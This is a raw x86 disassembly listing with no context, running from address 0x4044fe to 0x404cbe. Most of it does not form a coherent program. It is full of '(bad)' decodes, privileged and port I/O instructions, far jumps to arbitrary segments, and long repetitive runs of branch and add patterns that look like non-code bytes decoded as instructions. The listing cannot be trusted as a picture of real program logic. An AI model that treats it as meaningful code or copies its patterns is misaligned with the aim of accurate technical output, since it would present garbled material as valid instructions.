  4044fe:	mov    cl,0x1a
  404500:	sub    BYTE PTR [ebx+esi*2+0x2dbeb771],0xcf
  404508:	out    dx,al
  404509:	mov    edi,0xb2d9a4ef
  40450e:	mov    al,0xb2
  404510:	pop    esp
  404511:	mov    bl,0x7a
  404513:	fldcw  WORD PTR [ebx+0x41]
  404516:	cmp    al,0x67
  404518:	xor    dh,BYTE PTR [eax]
  40451a:	test   BYTE PTR [eax*1+0x3849a20b],0xea
  404522:	ja     0x404544
  404524:	pcmpeqw mm7,QWORD PTR [ebp+0x65]
  404528:	sahf   
  404529:	mov    ds:0xd4f42316,eax
  40452e:	jno    0x40451a
  404530:	loope  0x404583
  404532:	jae    0x4044dc
  404534:	mov    BYTE PTR [esi-0x7b],al
  404537:	outs   dx,BYTE PTR ds:[esi]
  404538:	inc    DWORD PTR ss:[ebx+0x1ee05c2c]
  40453f:	div    BYTE PTR [edi-0x2d4bc9db]
  404545:	cmp    dh,BYTE PTR [eax]
  404547:	jb     0x4045b5
  404549:	jmp    0x404593
  40454b:	xor    BYTE PTR [esi],al
  40454d:	int3   
  40454e:	inc    ebx
  40454f:	std    
  404550:	sldt   WORD PTR [eax]
  404553:	add    BYTE PTR [eax],al
  404555:	add    BYTE PTR [ecx+0x44],cl
  404558:	mov    ebx,0x78d28e7a
  40455d:	les    esi,FWORD PTR [edi]
  40455f:	shl    DWORD PTR [esi],1
  404561:	scas   al,BYTE PTR es:[edi]
  404562:	push   0x2de902fc
  404567:	sti    
  404568:	les    eax,FWORD PTR [ebx+0x3d7ef952]
  40456e:	xchg   ebx,eax
  40456f:	cli    
  404570:	inc    eax
  404571:	push   edi
  404572:	fs xchg ebp,eax
  404574:	or     eax,DWORD PTR [ecx-0x1f]
  404577:	mov    cs,ebp
  404579:	sub    edx,esi
  40457b:	cwde   
  40457c:	xchg   DWORD PTR [ebp-0xb67051],edx
  404582:	mov    al,0xc2
  404584:	sbb    al,0x5d
  404586:	adc    eax,0x2a375ec1
  40458b:	push   ebx
  40458c:	cwde   
  40458d:	mov    DWORD PTR [ebx+0x54],edi
  404590:	(bad)  
  404592:	cmp    al,0x5f
  404594:	adc    esi,ebp
  404596:	mov    ecx,0xfe9f5578
  40459b:	ins    DWORD PTR es:[edi],dx
  40459c:	(bad)  
  40459d:	and    DWORD PTR [edi-0x7b],eax
  4045a0:	ror    DWORD PTR [edx+0x58],1
  4045a3:	add    bh,BYTE PTR [esi-0x484596d3]
  4045a9:	imul   ebx,ebx,0xffffffa7
  4045ac:	mov    ebp,0xb4502da9
  4045b1:	out    0x4,eax
  4045b3:	sbb    DWORD PTR [ecx-0x6801eeda],0x64
  4045bd:	add    BYTE PTR [eax],al
  4045bf:	inc    ebx
  4045c0:	rcr    DWORD PTR [ecx-0x64d35a5e],cl
  4045c6:	loopne 0x404644
  4045c8:	xor    eax,0xf21b3a2c
  4045cd:	and    al,0x78
  4045cf:	jmp    0x5ffe74b2
  4045d4:	sbb    BYTE PTR [esi],ah
  4045d6:	cld    
  4045d7:	inc    edx
  4045d8:	dec    ecx
  4045d9:	sub    esi,DWORD PTR [ecx]
  4045db:	mov    ds:0xb16f2ac6,eax
  4045e0:	fwait
  4045e1:	sub    BYTE PTR [ebp-0xcd69c09],dh
  4045e7:	fisubr DWORD PTR [edx+esi*1+0x47]
  4045eb:	or     ch,BYTE PTR [edx+0x33]
  4045ee:	mov    DWORD PTR [eax+0x4ecb2176],edi
  4045f4:	shl    BYTE PTR [eax],0xd
  4045f7:	fs xchg ecx,eax
  4045f9:	xor    eax,0x2c0e7240
  4045fe:	and    BYTE PTR [eax],0x43
  404601:	es (bad) 
  404603:	(bad)  
  404604:	sti    
  404605:	push   ds
  404606:	push   es
  404607:	fsubr  st(4),st
  404609:	ja     0x404673
  40460b:	add    eax,DWORD PTR [edx+0x79]
  40460e:	es xchg ecx,eax
  404610:	push   cs
  404611:	jnp    0x4045ff
  404613:	xor    al,0xe8
  404615:	jns    0x4045c1
  404617:	dec    ebp
  404618:	stc    
  404619:	pop    esi
  40461a:	popa   
  40461b:	cmp    esi,DWORD PTR [esi+0x56]
  40461e:	pop    ds
  40461f:	leave  
  404620:	imul   eax,DWORD PTR [eax],0x5c
  404626:	add    BYTE PTR [eax],al
  404628:	push   eax
  404629:	lods   al,BYTE PTR ds:[esi]
  40462a:	repnz push ebp
  40462c:	push   ss
  40462d:	add    ebp,0xffffff86
  404630:	ret    0xf8bd
  404633:	jg     0x4046a1
  404635:	addr16 iret 
  404637:	jne    0x404667
  404639:	icebp  
  40463a:	xchg   ebp,eax
  40463b:	ins    BYTE PTR es:[edi],dx
  40463c:	loopne 0x404659
  40463e:	mov    eax,ds:0x2425ab61
  404643:	pusha  
  404644:	test   edi,edi
  404646:	adc    dl,BYTE PTR [edx+0x47]
  404649:	pop    ecx
  40464a:	dec    edx
  40464b:	push   ebx
  40464c:	or     DWORD PTR [ebp+edi*2+0x2fcfef74],esi
  404653:	ins    DWORD PTR es:[edi],dx
  404654:	shl    DWORD PTR ds:0xa3736707,0x5e
  40465b:	pop    esi
  40465c:	sub    eax,0xf673698a
  404661:	ja     0x40464f
  404663:	jb     0x40469d
  404665:	(bad)  
  404666:	(bad)  [eax-0x16]
  404669:	dec    edx
  40466a:	and    BYTE PTR [ecx-0x4c],0xe1
  40466e:	mov    ah,0x6a
  404670:	pop    eax
  404671:	push   ds
  404672:	mov    BYTE PTR [ebx-0x72],ch
  404675:	add    al,0xbf
  404677:	imul   ecx,esp,0xa68e665
  40467d:	mov    ecx,0xc6416dd1
  404682:	push   esp
  404683:	fs addr16 pop esp
  404686:	arpl   WORD PTR [esi-0x5b],bp
  404689:	in     eax,dx
  40468a:	cmp    DWORD PTR [edi+0x0],esp
  40468d:	add    BYTE PTR [eax],al
  40468f:	add    BYTE PTR [eax],al
  404691:	rcl    DWORD PTR [eax],cl
  404693:	or     eax,0xa0b2d790
  404698:	xchg   ecx,eax
  404699:	cdq    
  40469a:	pop    ebx
  40469b:	xchg   edi,eax
  40469c:	sub    DWORD PTR [ebx-0x2],0xffffffcd
  4046a0:	adc    BYTE PTR ds:0xe200f924,0x69
  4046a7:	js     0x404725
  4046a9:	add    esp,DWORD PTR [edi-0x230eb4ef]
  4046af:	stos   DWORD PTR es:[edi],eax
  4046b0:	adc    ah,al
  4046b2:	sub    eax,esi
  4046b4:	and    eax,0x18816fab
  4046b9:	mov    edx,0xb82feab1
  4046be:	repz push esp
  4046c0:	jbe    0x40467b
  4046c2:	inc    ebp
  4046c3:	aas    
  4046c4:	inc    ecx
  4046c5:	lods   al,BYTE PTR ds:[esi]
  4046c6:	jbe    0x4046f1
  4046c8:	les    edi,FWORD PTR [ebp-0x400cbd48]
  4046ce:	cli    
  4046cf:	cld    
  4046d0:	stos   BYTE PTR es:[edi],al
  4046d1:	scas   al,BYTE PTR es:[edi]
  4046d2:	sub    al,0x97
  4046d4:	popf   
  4046d5:	stc    
  4046d6:	shl    DWORD PTR [ebx-0x30],0xe8
  4046da:	xchg   ebx,eax
  4046db:	sbb    bh,ah
  4046dd:	jmp    0xcd7f:0xebbea73d
  4046e4:	mov    DWORD PTR [esi-0x35],edi
  4046e7:	fisttp DWORD PTR [edi+ebp*2]
  4046ea:	std    
  4046eb:	mov    al,0x3b
  4046ed:	ins    DWORD PTR es:[edi],dx
  4046ee:	inc    edi
  4046ef:	punpckldq mm3,DWORD PTR [ecx+ecx*4+0x65]
  4046f4:	push   ebp
  4046f5:	add    BYTE PTR [eax],al
  4046f7:	add    BYTE PTR [eax],al
  4046f9:	add    BYTE PTR [edi+0x65],dl
  4046fc:	and    ch,BYTE PTR [eax+0x56]
  4046ff:	xchg   ebx,eax
  404700:	inc    edi
  404701:	pop    edi
  404702:	and    al,0xd1
  404704:	cmc    
  404705:	push   es
  404706:	and    eax,0x30319c0f
  40470b:	dec    esp
  40470c:	mov    dh,BYTE PTR [ecx+esi*2+0x6383df9a]
  404713:	fcomp  DWORD PTR [ebp-0x26]
  404716:	push   edx
  404717:	push   ss
  404718:	xor    al,0xed
  40471a:	mov    WORD PTR [eax],es
  40471c:	add    BYTE PTR [eax],al
  40471e:	aam    0x2c
  404720:	addr16 gs jne 0x4046a5
  404724:	or     al,0xc8
  404726:	out    dx,al
  404727:	cwde   
  404728:	push   eax
  404729:	scas   eax,DWORD PTR es:[edi]
  40472a:	mov    ecx,DWORD PTR [ebx]
  40472c:	and    DWORD PTR [edi-0xf4a7336],edx
  404732:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404733:	push   es
  404734:	sub    ebx,DWORD PTR [edi+0x41]
  404737:	inc    edi
  404738:	scas   al,BYTE PTR es:[edi]
  404739:	cmp    BYTE PTR [edi+eiz*2],bl
  40473c:	dec    edi
  40473d:	sub    BYTE PTR [edx-0x9],ah
  404740:	or     ecx,DWORD PTR [edi-0x1]
  404743:	cld    
  404744:	pop    eax
  404745:	loopne 0x404720
  404747:	dec    esp
  404748:	add    al,0x87
  40474a:	je     0x40471b
  40474c:	lods   eax,DWORD PTR ds:[esi]
  40474d:	mov    edi,0xd82917ed
  404752:	dec    eax
  404753:	mov    dh,BYTE PTR [esi+0x22f16677]
  404759:	adc    bl,al
  40475b:	pop    ecx
  40475c:	cld    
  40475d:	push   esi
  40475e:	add    BYTE PTR [eax],al
  404760:	add    BYTE PTR [eax],al
  404762:	add    dl,dh
  404764:	xor    DWORD PTR [eax+0x30],esp
  404767:	wrmsr  
  404769:	repz sahf 
  40476b:	imul   esp,DWORD PTR [edi+0x67],0x19dc84f8
  404772:	sar    BYTE PTR [ebp+0x18a7bebc],0x57
  404779:	adc    DWORD PTR [eax],ecx
  40477b:	ss test ah,0x6f
  40477f:	xchg   ebx,eax
  404780:	push   ss
  404781:	push   0xf4c6457f
  404786:	pop    ss
  404787:	pusha  
  404788:	lods   al,BYTE PTR ds:[esi]
  404789:	pop    edi
  40478a:	mov    bh,0xbe
  40478c:	sbb    al,0xfb
  40478e:	iret   
  40478f:	fistp  DWORD PTR [edi+0x475ae8c6]
  404795:	adc    cl,BYTE PTR [edi+0x20bcd937]
  40479b:	shl    DWORD PTR [ecx+0x2ac4719],1
  4047a1:	mov    edx,edx
  4047a3:	jecxz  0x404779
  4047a5:	add    BYTE PTR [esi-0x271cc843],al
  4047ab:	sbb    ecx,DWORD PTR [ebp-0x65]
  4047ae:	jge    0x404825
  4047b0:	mov    dl,0x16
  4047b2:	xor    al,0xad
  4047b4:	sub    DWORD PTR [esi-0x58],edx
  4047b7:	retf   0x6c06
  4047ba:	cmp    esp,DWORD PTR [ebp-0x60]
  4047bd:	in     al,dx
  4047be:	sahf   
  4047bf:	add    bh,BYTE PTR [ebx+0xc]
  4047c2:	jle    0x4047be
  4047c4:	mov    al,0xbc
  4047c6:	fiadd  DWORD PTR [eax]
  4047c8:	add    BYTE PTR [eax],al
  4047ca:	add    BYTE PTR [eax],al
  4047cc:	sub    cl,BYTE PTR [esi-0x5a]
  4047cf:	test   DWORD PTR [edx-0x6d2ee9c8],esi
  4047d5:	rcl    DWORD PTR [edx+0x1b7c85a0],cl
  4047db:	cmp    al,0xa2
  4047dd:	lahf   
  4047de:	sub    DWORD PTR [edi+0x3371053d],esp
  4047e4:	fisubr DWORD PTR [ecx]
  4047e6:	pop    ecx
  4047e7:	jmp    0x6cf1a8f6
  4047ec:	jmp    0x4ae8:0x52e1b3bd
  4047f3:	jbe    0x404797
  4047f5:	inc    ebx
  4047f6:	(bad)  
  4047f7:	dec    edx
  4047f8:	bound  ecx,QWORD PTR [esi+eiz*1+0x1c6f7d8f]
  4047ff:	inc    esp
  404800:	sbb    dl,BYTE PTR ds:0xf9b597bc
  404806:	(bad)  [ebp+eiz*4+0x43]
  40480a:	ins    BYTE PTR es:[edi],dx
  40480b:	loope  0x404810
  40480d:	out    0x75,eax
  40480f:	outs   dx,BYTE PTR ds:[esi]
  404810:	pop    ebp
  404811:	mov    ebp,0x623be9c6
  404816:	inc    ebx
  404817:	xchg   edi,eax
  404818:	cmp    bh,cl
  40481a:	jmp    0xf2d9:0x165542
  404821:	adc    BYTE PTR [edx-0x855d6bf],0x82
  404828:	mov    ds:0x190a3d2a,al
  40482d:	rcl    DWORD PTR [edi+0x18],cl
  404830:	add    BYTE PTR [eax],al
  404832:	add    BYTE PTR [eax],al
  404834:	add    BYTE PTR [edx+0x1760b682],cl
  40483a:	mov    edx,ebx
  40483c:	fld    QWORD PTR [eax+0x3c8d6ac1]
  404842:	pop    ebx
  404843:	emms   
  404845:	mov    DWORD PTR [ecx],ecx
  404847:	loope  0x404830
  404849:	xor    eax,0xd9478423
  40484e:	adc    dl,dl
  404850:	xchg   DWORD PTR [edx-0x7],eax
  404853:	mov    dh,0x9d
  404855:	iret   
  404856:	dec    edx
  404857:	pop    ecx
  404858:	sbb    eax,0x983cb14a
  40485d:	xor    al,0xaa
  40485f:	test   DWORD PTR [eax],edx
  404861:	add    DWORD PTR [edx-0x1dd20d20],0xd
  404868:	stos   BYTE PTR es:[edi],al
  404869:	imul   edi,DWORD PTR [edx],0x17b326b
  40486f:	mov    ds:0xc71aa7da,al
  404874:	enter  0xc902,0x29
  404878:	xor    BYTE PTR [esi-0x6652b39e],bl
  40487e:	push   0xfffffff5
  404880:	cmp    eax,0x47909225
  404885:	xor    BYTE PTR [edx],0x7e
  404888:	xchg   edi,eax
  404889:	sbb    al,0xda
  40488b:	sbb    dh,bh
  40488d:	das    
  40488e:	jmp    0xd20b9fdf
  404893:	daa    
  404894:	dec    ebp
  404895:	mov    eax,es:0xedc6
  40489b:	add    BYTE PTR [eax],al
  40489d:	add    BYTE PTR [edx+0x7a],dh
  4048a0:	mov    ds:0xb04a1d00,eax
  4048a5:	sbb    dh,BYTE PTR [ebp-0x48802912]
  4048ab:	push   ebx
  4048ac:	js     0x40483f
  4048ae:	aas    
  4048af:	out    0x1e,eax
  4048b1:	hlt    
  4048b2:	push   edi
  4048b3:	pushf  
  4048b4:	test   BYTE PTR [ebx],0x1f
  4048b7:	and    BYTE PTR [eax+0x3ea4fd66],dl
  4048bd:	mov    BYTE PTR [ebp+0x19],dh
  4048c0:	pop    eax
  4048c1:	in     eax,dx
  4048c2:	lock cmp ah,BYTE PTR [eax+0x54]
  4048c6:	pop    eax
  4048c7:	jge    0x4048d0
  4048c9:	xor    DWORD PTR [edx+0x42],ecx
  4048cc:	test   al,0xdf
  4048ce:	bnd jbe 0x4048a0
  4048d1:	mov    edx,0xecdf181a
  4048d6:	xchg   edx,eax
  4048d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048d8:	mov    bh,0x89
  4048da:	and    BYTE PTR [ecx],0x17
  4048dd:	addr16 mov eax,0x2d026f9d
  4048e3:	jne    0x40492d
  4048e5:	mov    ebx,0xde2f41e5
  4048ea:	pop    es
  4048eb:	jg     0x40486d
  4048ed:	xor    BYTE PTR [edi+0x3b],ch
  4048f0:	out    0x55,eax
  4048f2:	daa    
  4048f3:	mov    ah,0x9f
  4048f5:	pushf  
  4048f6:	dec    edi
  4048f7:	mov    edi,eax
  4048f9:	stc    
  4048fa:	dec    ebp
  4048fb:	lods   al,BYTE PTR ds:[esi]
  4048fc:	addr16 pop ss
  4048fe:	and    eax,0x720f0f
  404903:	add    BYTE PTR [eax],al
  404905:	add    BYTE PTR [eax],al
  404907:	inc    eax
  404908:	shl    DWORD PTR [esi],cl
  40490a:	retf   
  40490b:	or     BYTE PTR [esi+0x50],ah
  40490e:	scas   al,BYTE PTR es:[edi]
  40490f:	sbb    bl,cl
  404911:	inc    BYTE PTR [eax-0x5e]
  404914:	outs   dx,BYTE PTR ds:[esi]
  404915:	cwde   
  404916:	and    eax,0x7388112a
  40491b:	ret    0xeeab
  40491e:	push   ss
  40491f:	jne    0x4048c0
  404921:	test   DWORD PTR [eax-0x43],eax
  404924:	shl    BYTE PTR ds:[esi],cl
  404927:	adc    BYTE PTR [edx+0x22511f9c],bh
  40492d:	cmp    DWORD PTR [eax+0x34],edi
  404930:	and    al,0xa4
  404932:	xlat   BYTE PTR ds:[ebx]
  404933:	retf   0x2f4b
  404936:	mov    al,0xbf
  404938:	mov    ch,0x2c
  40493a:	mov    dh,0x4e
  40493c:	(bad)  
  40493d:	test   al,0xd1
  40493f:	and    esp,eax
  404941:	xor    edi,DWORD PTR [esi-0x3b]
  404944:	mov    edi,0x3c48199f
  404949:	iret   
  40494a:	and    cl,bl
  40494c:	arpl   WORD PTR [edx-0x2a9e93ba],cx
  404952:	call   0x8ec213a9
  404957:	div    DWORD PTR [ecx+0xa219ea0]
  40495d:	xor    al,0xf9
  40495f:	add    al,0x1c
  404961:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404962:	push   esi
  404963:	call   0x8240:0x6f312bb3
  40496a:	or     DWORD PTR [eax],eax
  40496c:	add    BYTE PTR [eax],al
  40496e:	add    BYTE PTR [eax],al
  404970:	div    BYTE PTR [eax-0x58e4922a]
  404976:	mov    ecx,eax
  404978:	ins    DWORD PTR es:[edi],dx
  404979:	(bad)  
  40497a:	int3   
  40497b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40497c:	mov    al,ds:0xd1e14366
  404981:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404982:	pop    DWORD PTR [esi+0x293c9134]
  404988:	dec    edx
  404989:	adc    BYTE PTR [eax-0x1a74c0b2],bl
  40498f:	jne    0x404977
  404991:	adc    esi,DWORD PTR [ecx+0x11]
  404994:	or     esi,DWORD PTR [edx]
  404996:	fidivr WORD PTR [ebp-0x268506a3]
  40499c:	jo     0x4049a0
  40499e:	mov    eax,ds:0x293bbc97
  4049a3:	cmp    edx,DWORD PTR [ebx]
  4049a5:	loope  0x4049e1
  4049a7:	nop
  4049a8:	je     0x40496c
  4049aa:	add    DWORD PTR [ebx+ebx*1+0x65],0xfffffffe
  4049af:	js     0x4049fc
  4049b1:	out    dx,al
  4049b2:	lods   eax,DWORD PTR ds:[esi]
  4049b3:	fstp   QWORD PTR [ebp+0x9]
  4049b6:	xchg   esp,eax
  4049b7:	jb     0x4049bc
  4049b9:	js     0x4049bf
  4049bb:	out    0x85,al
  4049bd:	xchg   esp,eax
  4049be:	xor    al,0x1d
  4049c0:	ins    BYTE PTR es:[edi],dx
  4049c1:	add    eax,0x2203b9d4
  4049c6:	into   
  4049c7:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4049c9:	sub    BYTE PTR [esi],0xb2
  4049cc:	sub    ebx,DWORD PTR [ebx+0x33f8fbab]
  4049d2:	inc    ebx
  4049d3:	push   edi
  4049d4:	add    BYTE PTR [eax],al
  4049d6:	add    BYTE PTR [eax],al
  4049d8:	add    BYTE PTR [edi+edx*8+0x40],cl
  4049dc:	add    al,0xb3
  4049de:	test   eax,0x4e945099
  4049e3:	jno    0x404996
  4049e5:	test   BYTE PTR [ecx+ebx*8-0x348054dc],bl
  4049ec:	mov    ecx,0x1e73213c
  4049f1:	adc    eax,DWORD PTR [esi]
  4049f3:	out    dx,al
  4049f4:	dec    esi
  4049f5:	ror    DWORD PTR [esi+edi*1+0x3],cl
  4049f9:	xor    al,0xaa
  4049fb:	inc    esp
  4049fc:	pop    eax
  4049fd:	mov    ebx,eax
  4049ff:	sar    ebx,cl
  404a01:	jge    0x404a36
  404a03:	add    al,0x16
  404a05:	mov    ebx,0x4cc2846c
  404a0a:	(bad)  
  404a0b:	sahf   
  404a0c:	or     eax,0xc8ddf0f3
  404a11:	aam    0x15
  404a13:	pop    ebx
  404a14:	hlt    
  404a15:	int    0xbc
  404a17:	adc    esp,DWORD PTR [eax+0x23]
  404a1a:	pop    edx
  404a1b:	add    cl,dh
  404a1d:	iret   
  404a1e:	icebp  
  404a1f:	inc    ebp
  404a20:	imul   ebx,DWORD PTR [edx+0x18],0x27bf4123
  404a27:	jne    0x4049b2
  404a29:	jo     0x404a2c
  404a2b:	adc    BYTE PTR [ebx+0x23fe5fb5],bl
  404a31:	mov    BYTE PTR [ecx-0x6eed6165],bh
  404a37:	and    cl,BYTE PTR [esi]
  404a39:	xchg   ecx,eax
  404a3a:	je     0x404a83
  404a3c:	hlt    
  404a3d:	add    BYTE PTR [eax],al
  404a3f:	add    BYTE PTR [eax],al
  404a41:	add    BYTE PTR [ebx],bh
  404a43:	leave  
  404a44:	test   al,0xa4
  404a46:	xchg   DWORD PTR [esp+ecx*8],ebp
  404a49:	pop    edi
  404a4a:	dec    edx
  404a4b:	mov    al,ds:0x78e7af06
  404a50:	arpl   WORD PTR [ebp+0x458ce832],si
  404a56:	add    DWORD PTR [eax+ebp*8-0x40],eax
  404a5a:	push   ebp
  404a5b:	or     edx,DWORD PTR [ecx+0x28]
  404a5e:	call   0x4f5a7e4f
  404a63:	push   ebx
  404a64:	fcmovb st,st(2)
  404a66:	loopne 0x404a1c
  404a68:	mov    edi,0xe9c4ff5a
  404a6d:	repnz mov ebx,0xe6f08c63
  404a73:	cld    
  404a74:	popa   
  404a75:	dec    eax
  404a76:	jb     0x404a93
  404a78:	pop    es
  404a79:	lds    ebx,FWORD PTR [ecx+0xd65be33]
  404a7f:	fcomp  st(2)
  404a81:	pop    edi
  404a82:	mov    al,ds:0x14bf356b
  404a87:	nop
  404a88:	push   eax
  404a89:	cmovge ecx,DWORD PTR [ebx-0x67]
  404a8d:	jg     0x404a6d
  404a8f:	lods   al,BYTE PTR ds:[esi]
  404a90:	cld    
  404a91:	gs dec ebx
  404a93:	adc    edx,DWORD PTR [edx]
  404a95:	adc    eax,0x76f516
  404a9a:	add    eax,0xbdce2dac
  404a9f:	cmovns ebp,DWORD PTR [ebx+0x45e5b2cf]
  404aa6:	add    BYTE PTR [eax],al
  404aa8:	add    BYTE PTR [eax],al
  404aaa:	add    BYTE PTR [edi-0x7a],al
  404aad:	and    DWORD PTR [eax],0x7691617f
  404ab3:	mov    bh,0xdd
  404ab5:	cmc    
  404ab6:	adc    edx,DWORD PTR ds:0x8dfd5969
  404abc:	aam    0x3d
  404abe:	cwde   
  404abf:	add    BYTE PTR [eax-0x4c77defa],cl
  404ac5:	pusha  
  404ac6:	inc    esp
  404ac7:	dec    edx
  404ac8:	push   cs
  404ac9:	into   
  404aca:	stos   BYTE PTR es:[edi],al
  404acb:	and    ch,BYTE PTR [edx-0x2353058]
  404ad1:	inc    eax
  404ad2:	cmp    BYTE PTR [edx],dh
  404ad4:	shl    DWORD PTR [esi],0x5d
  404ad7:	and    ah,dh
  404ad9:	mov    BYTE PTR [ebx-0x2911b7e8],dh
  404adf:	xchg   ebp,eax
  404ae0:	xchg   ebx,eax
  404ae1:	aad    0x6f
  404ae3:	sub    eax,0x1f0ab127
  404ae8:	mov    bl,BYTE PTR ds:0x792e97e4
  404aee:	or     DWORD PTR [edi+0x48],0xf5a7d769
  404af5:	or     eax,0xa1c0a5b2
  404afa:	pop    esp
  404afb:	sbb    eax,0x9039c5ff
  404b00:	das    
  404b01:	inc    BYTE PTR [eax-0x1a6775c8]
  404b07:	fisub  DWORD PTR [eax]
  404b09:	or     esi,DWORD PTR ss:[edx+0x6e5092]
  404b10:	add    BYTE PTR [eax],al
  404b12:	add    BYTE PTR [eax],al
  404b14:	call   0x7158:0x62a715e4
  404b1b:	ret    0x775
  404b1e:	pop    ds
  404b1f:	fisub  WORD PTR [ecx+0x3cb9b317]
  404b25:	xchg   edx,eax
  404b26:	pop    es
  404b27:	and    ebp,0xe64c09
  404b2d:	js     0x404b30
  404b2f:	dec    ecx
  404b30:	dec    esi
  404b31:	mov    al,0x54
  404b33:	imul   ebx,DWORD PTR cs:[eax-0x4f],0x3e
  404b38:	sub    eax,0x88591de0
  404b3d:	add    ch,BYTE PTR [ebx+0x2649b6f6]
  404b43:	xchg   ecx,eax
  404b44:	rcl    esi,cl
  404b46:	push   ebx
  404b47:	test   eax,0xcdff1782
  404b4c:	pop    ds
  404b4d:	jge    0x404b9b
  404b4f:	popa   
  404b50:	jmp    0x84465451
  404b55:	call   0x3:0x9b750003
  404b5c:	jne    0x404af9
  404b5e:	add    eax,DWORD PTR [eax]
  404b60:	jne    0x404afb
  404b62:	add    eax,DWORD PTR [eax]
  404b64:	jne    0x404aff
  404b66:	add    eax,DWORD PTR [eax]
  404b68:	jne    0x404b03
  404b6a:	add    eax,DWORD PTR [eax]
  404b6c:	jne    0x404b07
  404b6e:	add    eax,DWORD PTR [eax]
  404b70:	jne    0x404b0b
  404b72:	add    eax,DWORD PTR [eax]
  404b74:	jne    0x404b10
  404b76:	add    eax,DWORD PTR [eax]
  404b78:	add    BYTE PTR [eax],al
  404b7a:	add    BYTE PTR [eax],al
  404b7c:	add    BYTE PTR [ebp-0x66],dh
  404b7f:	add    eax,DWORD PTR [eax]
  404b81:	jne    0x404b1d
  404b83:	add    eax,DWORD PTR [eax]
  404b85:	jne    0x404b21
  404b87:	add    eax,DWORD PTR [eax]
  404b89:	jne    0x404b22
  404b8b:	add    eax,DWORD PTR [eax]
  404b8d:	jne    0x404b26
  404b8f:	add    eax,DWORD PTR [eax]
  404b91:	jne    0x404b2a
  404b93:	add    eax,DWORD PTR [eax]
  404b95:	jne    0x404b2e
  404b97:	add    eax,DWORD PTR [eax]
  404b99:	jne    0x404b9d
  404b9b:	jmp    0x7503:0xea027503
  404ba2:	add    ch,dl
  404ba4:	add    esi,DWORD PTR [ebp+0x2]
  404ba7:	jmp    0x7503:0xed027503
  404bae:	add    ah,ch
  404bb0:	add    esi,DWORD PTR [ebp+0x2]
  404bb3:	in     eax,dx
  404bb4:	add    esi,DWORD PTR [ebp+0x2]
  404bb7:	in     eax,0x3
  404bb9:	jne    0x404bbd
  404bbb:	in     al,dx
  404bbc:	add    esi,DWORD PTR [ebp+0x2]
  404bbf:	in     al,0x3
  404bc1:	jne    0x404bc5
  404bc3:	in     al,dx
  404bc4:	add    esi,DWORD PTR [ebp+0x2]
  404bc7:	in     al,0x3
  404bc9:	jne    0x404bcd
  404bcb:	jmp    0xd942c0d3
  404bd0:	hlt    
  404bd1:	test   BYTE PTR [edx],al
  404bd3:	loope  0x404bdb
  404bd5:	jl     0x404bdb
  404bd7:	jecxz  0x404be1
  404bd9:	jle    0x404be1
  404bdb:	cmc    
  404bdc:	add    BYTE PTR [eax+0x0],dh
  404bdf:	out    dx,eax
  404be0:	add    al,BYTE PTR [eax]
  404be2:	add    BYTE PTR [eax],al
  404be4:	add    BYTE PTR [eax],al
  404be6:	push   0x2
  404be8:	jmp    0xe942c0f0
  404bed:	add    esi,DWORD PTR [ebp+0x2]
  404bf0:	jmp    0xe942c0f8
  404bf5:	add    esi,DWORD PTR [ebp+0x2]
  404bf8:	call   0xe842c100
  404bfd:	add    esi,DWORD PTR [ebp+0x2]
  404c00:	jmp    0x404c05
  404c02:	jne    0x404c06
  404c04:	jmp    0x404c09
  404c06:	jne    0x404c0a
  404c08:	jmp    0x7503:0xea027503
  404c0f:	add    ch,ch
  404c11:	add    esi,DWORD PTR [ebp+0x2]
  404c14:	in     eax,0x3
  404c16:	jne    0x404c1a
  404c18:	add    ah,ch
  404c1a:	jbe    0x404c1e
  404c1c:	add    ah,ah
  404c1e:	jbe    0x404c22
  404c20:	add    bh,ch
  404c22:	jbe    0x404c26
  404c24:	add    bh,ah
  404c26:	jbe    0x404c2a
  404c28:	add    dh,ch
  404c2a:	jbe    0x404c2e
  404c2c:	add    dh,ah
  404c2e:	jbe    0x404c32
  404c30:	add    cl,dh
  404c32:	jbe    0x404c36
  404c34:	add    cl,dh
  404c36:	jbe    0x404c3a
  404c38:	add    al,ah
  404c3a:	jbe    0x404c3e
  404c3c:	add    al,ah
  404c3e:	jbe    0x404c42
  404c40:	add    bl,dh
  404c42:	jbe    0x404c46
  404c44:	add    bl,dh
  404c46:	jbe    0x404c4a
  404c48:	add    dl,ah
  404c4a:	add    BYTE PTR [eax],al
  404c4c:	add    BYTE PTR [eax],al
  404c4e:	add    BYTE PTR [esi+0x2],dh
  404c51:	add    dl,ah
  404c53:	jbe    0x404c57
  404c55:	add    ch,dh
  404c57:	jbe    0x404c5b
  404c59:	add    ch,ch
  404c5b:	jbe    0x404c5f
  404c5d:	add    ah,ah
  404c5f:	jbe    0x404c63
  404c61:	add    ah,bl
  404c63:	jbe    0x404c67
  404c65:	add    cl,ch
  404c67:	jbe    0x404c6b
  404c69:	add    cl,ch
  404c6b:	jbe    0x404c6f
  404c6d:	add    cl,ch
  404c6f:	jbe    0x404c73
  404c71:	add    cl,ch
  404c73:	jbe    0x404c77
  404c75:	add    cl,ch
  404c77:	jbe    0x404c7b
  404c79:	add    cl,ch
  404c7b:	jbe    0x404c7f
  404c7d:	add    cl,ch
  404c7f:	jbe    0x404c83
  404c81:	add    cl,ch
  404c83:	jbe    0x404c87
  404c85:	add    cl,ch
  404c87:	jbe    0x404c8b
  404c89:	add    cl,ch
  404c8b:	jbe    0x404c8f
  404c8d:	add    cl,ch
  404c8f:	jbe    0x404c93
  404c91:	add    cl,ch
  404c93:	jbe    0x404c97
  404c95:	add    BYTE PTR [eax],al
  404c97:	or     al,0x6
  404c99:	add    BYTE PTR [eax],al
  404c9b:	or     al,0x6
  404c9d:	add    BYTE PTR [eax],al
  404c9f:	sbb    al,0x6
  404ca1:	add    BYTE PTR [eax],al
  404ca3:	sbb    al,0x6
  404ca5:	add    BYTE PTR [eax],al
  404ca7:	push   cs
  404ca8:	push   es
  404ca9:	add    BYTE PTR [eax],al
  404cab:	clts   
  404cad:	add    BYTE PTR [eax],al
  404caf:	jecxz  0x404cb6
  404cb1:	add    BYTE PTR [eax],al
  404cb3:	add    BYTE PTR [eax],al
  404cb5:	add    BYTE PTR [eax],al
  404cb7:	add    ah,bl
  404cb9:	add    eax,0x5e80000
  404cbe:	or     BYTE PTR [eax],al
